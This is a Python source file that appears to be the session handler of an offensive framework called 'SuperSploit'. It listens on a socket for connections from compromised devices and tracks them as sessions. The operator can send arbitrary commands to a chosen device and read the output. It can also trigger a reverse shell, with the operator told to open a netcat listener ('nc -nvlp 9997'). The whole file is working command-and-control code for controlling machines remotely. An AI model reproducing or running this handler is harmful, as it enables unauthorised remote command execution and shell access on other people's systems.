"""imports"""
import json
import os
import sys
import traceback
from subprocess import run
from threading import Thread
from socket import socket, AF_INET, SOCK_STREAM
from _socket import SO_REUSEADDR, SOL_SOCKET
from time import sleep
from prompt_toolkit import prompt
import hashlib
# integrated = True

#!#!#!
# This is a server style handler for many types of payloads
# This is like a server in a way
#
# REQUIRED OPTIONS
# L_HOST: local HOST
# L_PORT: local port
#!#!#!

input = prompt

# webserver tracker
n = 0


# lets get the variables


def clear():
    run(['clear'])


installlocation = f'{os.getenv("HOME")}/.SuperSploit'
cwd = os.getcwd()
with open(f"{installlocation}/.data/data.json") as file:
    variableDict = json.load(file)
    file.close()

"""global variables"""
host = "0.0.0.0" if input(f'Do you what to listen on all interfaces: ').startswith("y") else variableDict["L_HOST"]
port = int(variableDict["L_PORT"])

server = socket(AF_INET, SOCK_STREAM)
server.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
server.bind((host, port))
server.listen()

"""For connection tracking"""
clients = []
clientIds = []


class CustomImportedFunctions:
    def __init__(self):
        pass

    @staticmethod
    def recv(client):
        return client.recv(1024)

    @staticmethod
    def check(*client):
        try:
            client.send(b"200")
            if client.recv(1024) == b"200":
                print("Device is connected.")
            else:
                print("Device is not connected anymore.")
                clients.remove(client)
                clientIds.remove(clients[client.index(client)])
                return
        except Exception:
            return

    @staticmethod
    def Help(*args) -> None:
        with open(f"{installlocation}/.data/.help/session", 'r') as file:
            print(file.read())
            file.close()
            return

    @staticmethod
    def shell(client):
        try:
            input("open a terminal and type --> nc -nvlp 9997 then press enter")
            client.send(b"shell")
        except Exception:
            print(traceback.format_exc())
            return False

    @staticmethod
    def run(client):
        try:
            client.send(b"cmd")
            data = input("Enter command to be sent: ").encode()
            client.send(data)
            print(client.recv(1024))
            return True
        except Exception:
            print(traceback.format_exc())
            return False


try:
    class Network:

        def use(self):
            """Reconnect to a device that has been stored"""
            try:
                inputs = ["help", "shell", "check", "recv"]
                functs = [CustomImportedFunctions.Help, CustomImportedFunctions.shell, CustomImportedFunctions.check, CustomImportedFunctions.recv]
                # device index is passed by parent method
                device = int(self.string)
                print(self.string)
                # set a variable linked to the device that what's to be used;
                a = clients[device]

                while True:
                    # here we sleep to allow the device on the other side to finish the previous
                    sleep(2)
                    data = input(f'Sessions on {clientIds[int(self.string)]}: ')
                    if data in inputs:
                        functs[inputs.index(data)](a)
            except Exception as e:
                print(e)

        @classmethod
        def show(cls):
            n = 0
            run(["clear"])
            print('Socket connections')
            for a in clients:
                print(f"{n}: {a}\n")
                n += 1
            print('\n\nAddresses')
            n = 0
            for b in clientIds:
                print(f'{n}: {b}\n')
                n += 1

        @classmethod
        def broadcast(cls, message):
            for client in clients:
                try:
                    client.send(message)
                except OSError as e:
                    print(f'[!] Error when connection to {clientIds[clients.index(client)]}.\n   [Error Report]\n{e}')
                    return False
            return True

        @classmethod
        def handle(cls, client):
            if client in clients:
                if client.recv(1024) == b'200':
                    try:
                        client.send(b'200')
                        return True
                    except OSError:
                        return False
            return True

        @classmethod
        def __inback__(cls):
            try:
                client, clientAddress = server.accept()
                print(f'\n[!] Connected to {str(clientAddress[0])}')
                clientIds.append(clientAddress[0])
                clients.append(client)
                thread = Thread(target=cls.handle, args=(client,))
                thread.start()
                return True
            except OSError as e:
                print(e)
                return False

        @classmethod
        def receive(cls):
            print(f'[*] Server started on port {variableDict["L_PORT"]}.')
            while True:
                try:
                    if cls.__inback__():
                        continue
                except OSError as e:
                    print(e)
                    return True

        def setVals(self, val):
            self.string = val


    def mainMenu():
        while True:
            try:
                inputs = ['start', 'show', 'use', 'clear', 'help']
                functions = [Network.receive, Network.show, Network.use, clear, CustomImportedFunctions.Help]
                a = input('[Handler]: ')
                if "use" in a:
                    aa = Network()
                    aa.setVals(a.split(" ")[1])
                    aa.use()
                data = a
                for x in inputs:
                    if data == x:
                        funIndex = inputs.index(x)
                        if funIndex == 0:
                            a = Thread(target=Network.receive)
                            a.start()
                            data = None
                            a = None
                            continue
                        else:
                            for x in inputs:
                                if data in x:
                                    functions[inputs.index(x)]()
                                    continue
                    else:
                        continue
                continue
            except Exception as e:
                print(e)


    mainMenu()
except Exception as e:
    input(str(e))
    server.close()
    sys.exit()
